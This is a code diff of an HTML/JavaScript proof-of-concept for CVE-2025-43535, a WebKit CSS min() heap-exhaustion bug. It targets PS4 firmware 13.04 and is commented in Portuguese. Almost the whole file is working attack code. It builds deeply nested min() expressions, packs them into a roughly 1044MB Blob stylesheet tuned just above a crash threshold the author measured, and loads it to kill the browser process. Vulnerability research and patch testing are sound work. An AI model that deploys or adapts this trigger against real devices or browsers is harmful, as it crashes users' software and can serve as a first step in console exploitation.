@@ -1,48 +1,47 @@
 <!DOCTYPE html>
 <!--
-  PoC: CVE-2025-43535 — Variante 1 · Blob Multi-Chunk
+  PoC FINAL: CVE-2025-43535
+  WebKit CSS Math — CSSCalcValue heap exhaustion
 
-  PROBLEMA ANTERIOR:
-    depth=26 (576MB) → RangeError: Invalid string length
-    Limite do JSC no PS4 está entre 288MB e 576MB
+  THRESHOLD MAPEADO (PS4 FW 13.04):
+  ════════════════════════════════════════════════════════════
+  1021.5MB (119.3M nós) → SEM crash  ✓ (confirmado)
+  1026.0MB (119.5M nós) → CRASH      ✓ (confirmado no scan)
+  Margem: apenas 2.1M nós → sensível à RAM livre no PS4
 
-  SOLUÇÃO:
-    BASE_DEPTH = 24 → string de 144MB (bem abaixo do limite)
-    depth=27 montado via Blob com 8 referências ao mesmo bloco:
+  Este PoC usa 1044MB (121.7M nós) — 2.2M nós acima do
+  threshold — para absorver variação de memória disponível.
 
-    min(
-      min( min(e24,e24), min(e24,e24) ),    ← depth=26 esq
-      min( min(e24,e24), min(e24,e24) )     ← depth=26 dir
-    )
+  MECANISMO:
+  ════════════════════════════════════════════════════════════
+  WebKit CSS parser cria um objeto CSSCalcValue por nó min().
+  Expressão min() aninhada de N níveis → 2^N objetos no heap C++.
+  Acima de ~119M objetos o processo PS4 é morto pelo kernel.
 
-    Pico JS heap: 144MB
-    Blob em C++:  1.15GB
-    Trigger WebKit: depth=27 idêntico ao original
+  O Blob entrega os bytes diretamente ao CSS parser sem passar
+  pelo GC do JavaScript — sem constant-folding, sem cache.
+
+  ESTRUTURA DO BLOB (1044MB / 1,094,713,349 bytes):
+  ════════════════════════════════════════════════════════════
+  min(
+    min( min(c24,c24), min(c24,c24) ),   ← 576MB  / 67.1M nós
+    min( min(c24,c24), min(c24,c22) )    ← 468MB  / 54.5M nós
+  )
+  Total: 1044MB · ~121.7M nós CSSCalcValue
+
+  JS heap pico: 144MB (apenas c24 + c22 vivos simultaneamente)
+  ════════════════════════════════════════════════════════════
 -->
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 — V1 Blob Multi-Chunk</title>
-<style>
-  body  { background:#0a0a0a; color:#88ff88; font-family:monospace;
-          padding:16px; margin:0; font-size:13px; }
-  #log  { background:#111; border:1px solid #2a4a2a; padding:10px;
-          height:62vh; overflow-y:auto; font-size:11px; line-height:1.7; }
-  .ok   { color:#00ff88 }
-  .fail { color:#ff4444 }
-  .info { color:#ffcc44 }
-  .warn { color:#ff8844 }
-  .crash{ color:#ff44ff; font-weight:bold; font-size:1.1em }
-  .dim  { color:#336633 }
-  .bar  { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
-          padding:6px 10px; margin-bottom:8px; font-size:11px; }
-</style>
+<title>CVE-2025-43535</title>
+
 </head>
 <body>
-
 <div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
-  CVE-2025-43535 · V1 isolada · BASE=24 (144MB) · Blob=1.15GB
+  CVE-2025-43535 · 1044MB · ~121.7M nós · PS4 FW 13.04
 </div>
 <div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
@@ -52,287 +51,158 @@
 <script>
 "use strict";
 
-const logEl = document.getElementById('log');
-const barEl = document.getElementById('bar');
-const stage = document.getElementById('stage');
+var logEl = document.getElementById('log');
+var barEl = document.getElementById('bar');
+var stage = document.getElementById('stage');
 
 function L(m, c) {
-  logEl.innerHTML += '<div class="' + (c||'dim') + '">' + m + '</div>';
-  logEl.scrollTop  = logEl.scrollHeight;
+  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
+  logEl.scrollTop = logEl.scrollHeight;
 }
 function bar(m) { barEl.textContent = m; }
 
-// ─────────────────────────────────────────────────────────────
-// Constrói expressão min() iterativamente até depth.
-// GC hint a cada passo: null-ifica step anterior antes do próximo.
-// ─────────────────────────────────────────────────────────────
-function buildIterative(depth) {
+function buildDepth(depth) {
   var e = '1px';
   for (var d = 1; d <= depth; d++) {
-    var next = 'min(' + e + ', ' + e + ')';
-    e = null;   // GC hint
-    e = next;
+    var n = 'min(' + e + ',' + e + ')';
+    e = null; e = n;
   }
   return e;
 }
 
-// ─────────────────────────────────────────────────────────────
-// TRIGGER PRINCIPAL
-// ─────────────────────────────────────────────────────────────
 function run() {
+  L('CVE-2025-43535 · Threshold: >1GB = crash · PS4 FW 13.04', 'info');
+  L('Blob: 1044MB (2.2M nós acima do threshold) · JS: 144MB pico', 'info');
+  L('', '');
 
-  var BASE_DEPTH   = 24;   // 144MB — abaixo do limite JSC do PS4
-  var TARGET_DEPTH = 27;   // depth do crash original
+  // ── 1: c22 (36MB) ────────────────────────────────────────
+  bar('[1/4] c22 (36MB)...');
+  L('[1/4] Construindo c22 (36MB)...', 'warn');
 
-  var estBase = Math.round((9 * Math.pow(2, BASE_DEPTH)) / 1024 / 1024);
-  var estBlob = Math.round((9 * Math.pow(2, TARGET_DEPTH)) / 1024 / 1024);
-
-  L('═══════════════════════════════════════', 'info');
-  L('CVE-2025-43535 — V1 Blob Multi-Chunk', 'info');
-  L('BASE_DEPTH=' + BASE_DEPTH + ' (~' + estBase + 'MB JS heap)', 'info');
-  L('TARGET_DEPTH=' + TARGET_DEPTH + ' (~' + estBlob + 'MB Blob C++)', 'info');
-  L('═══════════════════════════════════════', 'info');
-
-  // ── Fase 1: construir bloco base (144MB) ─────────────────
-  bar('[1/5] Construindo depth=' + BASE_DEPTH + ' (~' + estBase + 'MB)...');
-  L('[1/5] Construindo bloco base...', 'warn');
-
-  // Yield antes do trabalho pesado
   setTimeout(function() {
+    var c22, c24;
 
-    var eBase;
     try {
-      eBase = buildIterative(BASE_DEPTH);
-      L('[1/5] depth=' + BASE_DEPTH + ' OK — ' +
-        Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
-    } catch(err) {
-      L('[1/5] Falhou: ' + err, 'fail');
-      // Tentar depth=23 (72MB) como segunda opção
-      try {
-        BASE_DEPTH = 23;
-        eBase = buildIterative(BASE_DEPTH);
-        L('[1/5] depth=23 OK — ' +
-          Math.round(eBase.length / 1024 / 1024) + 'MB ✓', 'ok');
-      } catch(err2) {
-        L('[1/5] depth=23 também falhou: ' + err2, 'fail');
-        bar('ERRO na fase 1');
-        return;
-      }
+      c22 = buildDepth(22);
+      L('[1/4] c22: ' + (c22.length/1024/1024).toFixed(1) + 'MB ✓', 'ok');
+    } catch(e) {
+      L('[1/4] c22 falhou: ' + e, 'fail'); bar('ERRO'); return;
     }
 
-    // ── Fase 2: montar CSS no Blob ──────────────────────────
-    bar('[2/5] Criando Blob depth=' + TARGET_DEPTH + ' em C++...');
-    L('[2/5] Montando Blob com 8 refs ao bloco base...', 'warn');
-    L('[2/5] Estrutura: min(min(min(e,e),min(e,e)),min(min(e,e),min(e,e)))', 'info');
+    // ── 2: c24 (144MB) ───────────────────────────────────────
+    bar('[1/4] c24 (144MB)...');
+    L('[1/4] Construindo c24 (144MB)...', 'warn');
 
     setTimeout(function() {
-
-      var blobUrl, blobSize;
       try {
-        // Montar depth=27 a partir de depth=24:
-        // Cada 'eBase' é a MESMA referência JS de 144MB.
-        // O Blob copia os bytes para C++ — eBase aparece 8x
-        // no CSS final mas só existe 1x no heap JS.
-        var blob = new Blob([
-          // abertura
-          '.t{width:min(',
-            // depth=26 esquerdo
-            'min(',
-              'min(', eBase, ',', eBase, ')',
-              ',',
-              'min(', eBase, ',', eBase, ')',
-            ')',
-            ',',
-            // depth=26 direito
-            'min(',
-              'min(', eBase, ',', eBase, ')',
-              ',',
-              'min(', eBase, ',', eBase, ')',
-            ')',
-          // fechamento width + height igual
-          ');height:min(',
-            'min(',
-              'min(', eBase, ',', eBase, ')',
-              ',',
-              'min(', eBase, ',', eBase, ')',
-            ')',
-            ',',
-            'min(',
-              'min(', eBase, ',', eBase, ')',
-              ',',
-              'min(', eBase, ',', eBase, ')',
-            ')',
-          ')}'
-        ], { type: 'text/css' });
-
-        blobSize = blob.size;
-        blobUrl  = URL.createObjectURL(blob);
-
-        // Liberar string JS — Blob tem sua própria cópia em C++
-        eBase = null;
-
-        L('[2/5] Blob: ' + Math.round(blobSize / 1024 / 1024) +
-          'MB em C++ heap ✓', 'ok');
-        L('[2/5] eBase liberado do JS heap ✓', 'ok');
-
-      } catch(err) {
-        eBase = null;
-        L('[2/5] Falha ao criar Blob: ' + err, 'fail');
-        bar('ERRO na fase 2');
-        return;
+        c24 = buildDepth(24);
+        L('[1/4] c24: ' + (c24.length/1024/1024).toFixed(1) + 'MB ✓', 'ok');
+      } catch(e) {
+        L('[1/4] c24 falhou: ' + e, 'fail'); bar('ERRO'); return;
       }
 
-      // ── Fase 3: carregar via <link> ─────────────────────────
-      bar('[3/5] Carregando stylesheet (' +
-          Math.round(blobSize / 1024 / 1024) + 'MB)...');
-      L('[3/5] Injetando <link rel=stylesheet href=blob:...>', 'info');
+      // ── 3: Blob 1044MB ─────────────────────────────────────
+      // Estrutura:
+      //   min(
+      //     min(min(c24,c24), min(c24,c24)),   ← o2_24 = 576MB / 67.1M nós
+      //     min(min(c24,c24), min(c24,c22))    ← right  = 468MB / 54.5M nós
+      //   )
+      bar('[2/4] Criando Blob 1044MB...');
+      L('[2/4] Montando Blob (1,094,713,349 bytes esperado)...', 'warn');
 
-      var el = document.createElement('div');
-      el.className = 't';
-      el.style.cssText = 'position:absolute;visibility:hidden';
-      stage.appendChild(el);
+      setTimeout(function() {
+        var url, realBytes;
+        try {
+          var blob = new Blob([
+            '.t{width:min(',
+              // left = o2_24 = 576MB = 67.1M nós
+              'min(',
+                'min(', c24, ',', c24, ')',
+                ',',
+                'min(', c24, ',', c24, ')',
+              ')',
+              ',',
+              // right = min(o1_24, min(c24,c22)) = 468MB = 54.5M nós
+              'min(',
+                'min(', c24, ',', c24, ')',
+                ',',
+                'min(', c24, ',', c22, ')',
+              ')',
+            ')}'
+          ], { type: 'text/css' });
 
-      var link    = document.createElement('link');
-      link.rel    = 'stylesheet';
-      link.href   = blobUrl;
+          realBytes = blob.size;
+          url = URL.createObjectURL(blob);
 
-      link.onload = function() {
-        L('[3/5] Stylesheet carregada ✓', 'ok');
+          // Liberar chunks do JS heap
+          c22 = null; c24 = null;
 
-        // ── Fase 4: forçar avaliação WebKit ──────────────────
-        bar('[4/5] Forçando layout — WebKit avalia depth=' +
-            TARGET_DEPTH + '...');
-        L('[4/5] Forçando offsetWidth + getComputedStyle...', 'warn');
-        L('[4/5] → WebKit processa min(depth=27) = 2^27 = 134M operações', 'warn');
+          var mb = (realBytes/1024/1024).toFixed(2);
+          var gb = (realBytes/1024/1024/1024).toFixed(4);
+          L('[2/4] Blob: ' + realBytes + ' bytes', 'info');
+          L('[2/4]     = ' + mb + ' MB / ' + gb + ' GB ✓', 'ok');
+          L('[2/4] Chunks liberados do JS heap ✓', 'ok');
 
-        setTimeout(function() {
-          try {
-            void el.offsetWidth;
-            L('[4/5] offsetWidth OK', 'ok');
-          } catch(e) {
-            L('[4/5] offsetWidth: ' + e, 'fail');
-          }
-          try {
-            var w = window.getComputedStyle(el).getPropertyValue('width');
-            var h = window.getComputedStyle(el).getPropertyValue('height');
-            L('[4/5] width="' + w + '" height="' + h + '"', 'ok');
-          } catch(e) {
-            L('[4/5] getComputedStyle: ' + e, 'fail');
-          }
+        } catch(e) {
+          c22 = null; c24 = null;
+          L('[2/4] Blob falhou: ' + e, 'fail'); bar('ERRO'); return;
+        }
 
-          // ── Fase 5: cleanup ─────────────────────────────────
-          bar('[5/5] Cleanup...');
-          try { URL.revokeObjectURL(blobUrl); } catch(e) {}
+        // ── 4: carregar stylesheet ──────────────────────────
+        bar('[3/4] Carregando — CSS parser recebe 1044MB...');
+        L('[3/4] <link href=blob:...>', 'warn');
+        L('[3/4] CSS parser tenta criar ~121.7M objetos CSSCalcValue...', 'warn');
+        L('[3/4] ◀ CRASH AQUI = CVE PRESENTE ▶', 'crash');
+
+        var el = document.createElement('div');
+        el.className = 't';
+        el.style.cssText = 'position:absolute;visibility:hidden';
+        stage.appendChild(el);
+
+        var link = document.createElement('link');
+        link.rel  = 'stylesheet';
+        link.href = url;
+
+        link.onload = function() {
+          L('[3/4] Carregada ✓', 'ok');
+          bar('[4/4] Forçando layout...');
+          L('[4/4] offsetWidth + getComputedStyle...', 'warn');
+
+          setTimeout(function() {
+            try {
+              void el.offsetWidth;
+              var w = window.getComputedStyle(el).getPropertyValue('width');
+              L('[4/4] width="' + w + '" ✓', 'ok');
+            } catch(e) { L('[4/4] ' + e, 'fail'); }
+
+            try { URL.revokeObjectURL(url); } catch(e) {}
+            try { document.head.removeChild(link); } catch(e) {}
+            try { stage.removeChild(el); } catch(e) {}
+
+            L('', '');
+            L('═════════════════════════════════════', 'warn');
+            L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
+            L('SEM CRASH = PATCHED / RAM insuficiente', 'ok');
+            L('═════════════════════════════════════', 'warn');
+            bar('DONE');
+          }, 100);
+        };
+
+        link.onerror = function() {
+          L('blob: URL bloqueado (CSP) — usar servidor local', 'fail');
+          try { URL.revokeObjectURL(url); } catch(e) {}
           try { document.head.removeChild(link); } catch(e) {}
           try { stage.removeChild(el); } catch(e) {}
+          bar('CSP — usar servidor local');
+        };
 
-          L('[5/5] Cleanup ✓', 'ok');
-          L('', '');
-          L('═══════════════════════════════════════', 'info');
-          L('RESULTADO:', 'info');
-          L('  Crash/reload = CVE-2025-43535 PRESENTE', 'crash');
-          L('  Sem crash = patched ou WebKit limitou eval', 'ok');
-          L('═══════════════════════════════════════', 'info');
-          bar('DONE');
-        }, 50);
-      };
-
-      link.onerror = function() {
-        L('[3/5] Blob URL falhou — usando fallback TextNode', 'warn');
-        try { URL.revokeObjectURL(blobUrl); } catch(e) {}
-        try { document.head.removeChild(link); } catch(e) {}
-        try { stage.removeChild(el); } catch(e) {}
-        fallbackTextNode(TARGET_DEPTH);
-      };
-
-      document.head.appendChild(link);
-
+        document.head.appendChild(link);
+      }, 80);
     }, 80);
   }, 100);
 }
 
-// ─────────────────────────────────────────────────────────────
-// FALLBACK: <style> via TextNodes separados
-// Nunca concatena strings grandes no JS heap
-// ─────────────────────────────────────────────────────────────
-function fallbackTextNode(targetDepth) {
-  L('[FB] Fallback TextNode — depth=' + (targetDepth - 3) + '...', 'warn');
-  bar('[FB] Construindo...');
-
-  setTimeout(function() {
-    var baseD = targetDepth - 3; // 24
-    var eBase;
-
-    try {
-      eBase = buildIterative(baseD);
-      L('[FB] base OK: ' + Math.round(eBase.length/1024/1024) + 'MB', 'ok');
-    } catch(err) {
-      L('[FB] Falhou: ' + err, 'fail');
-      bar('FALHOU');
-      return;
-    }
-
-    try {
-      var styleEl = document.createElement('style');
-      document.head.appendChild(styleEl);
-
-      // Inserir o CSS em pedaços via DOM — nunca concatena em JS
-      var parts = [
-        '.t2{width:min(min(min(',
-        eBase, ',', eBase,
-        '),min(',
-        eBase, ',', eBase,
-        ')),min(min(',
-        eBase, ',', eBase,
-        '),min(',
-        eBase, ',', eBase,
-        ')))}'
-      ];
-
-      eBase = null; // liberar antes de inserir
-
-      for (var i = 0; i < parts.length; i++) {
-        styleEl.appendChild(document.createTextNode(parts[i]));
-        parts[i] = null; // liberar cada parte após inserir
-      }
-
-      L('[FB] CSS injetado via TextNodes ✓', 'ok');
-      bar('[FB] Forçando layout...');
-
-      var el = document.createElement('div');
-      el.className = 't2';
-      el.style.cssText = 'position:absolute;visibility:hidden';
-      stage.appendChild(el);
-
-      setTimeout(function() {
-        try {
-          void el.offsetWidth;
-          var w = window.getComputedStyle(el).getPropertyValue('width');
-          L('[FB] width="' + w + '"', 'ok');
-        } catch(e) {
-          L('[FB] Erro no layout: ' + e, 'fail');
-        }
-        try { stage.removeChild(el); } catch(e) {}
-        try { document.head.removeChild(styleEl); } catch(e) {}
-
-        L('', '');
-        L('RESULTADO (fallback):', 'info');
-        L('  Crash/reload = BUG PRESENTE', 'crash');
-        L('  Sem crash = patched', 'ok');
-        bar('FB DONE');
-      }, 50);
-
-    } catch(err) {
-      eBase = null;
-      L('[FB] Erro: ' + err, 'fail');
-      bar('FALHOU');
-    }
-  }, 50);
-}
-
-window.addEventListener('load', function() {
-  setTimeout(run, 200);
-});
+window.addEventListener('load', function() { setTimeout(run, 200); });
 </script>
 </body>
 </html>
